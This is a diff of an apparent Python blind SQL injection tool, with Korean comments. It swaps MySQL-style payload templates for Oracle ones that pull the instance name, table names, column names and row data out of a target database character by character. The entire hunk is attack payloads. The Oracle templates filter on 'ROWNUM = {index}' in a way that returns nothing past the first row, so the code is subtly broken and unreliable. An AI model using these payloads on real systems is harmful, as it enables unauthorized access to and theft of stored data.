@@ -27,10 +27,10 @@ proxies = {
 
 # SQL Injection 페이로드 템플릿 설정 (Oracle DB용)
 payload_templates = {
-    "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
-    "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
-    "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
-    "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
+    "database_name": "1' AND SUBSTR((SELECT sys_context('userenv','instance_name') FROM dual), {i}, 1) = '{char}' --",
+    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual) AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' --",
+    "column_name": "1' AND SUBSTR((SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name = '{table_name}' AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' --",
+    "column_data": "1' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' --"
 }
 
 # 참/거짓 판별 함수
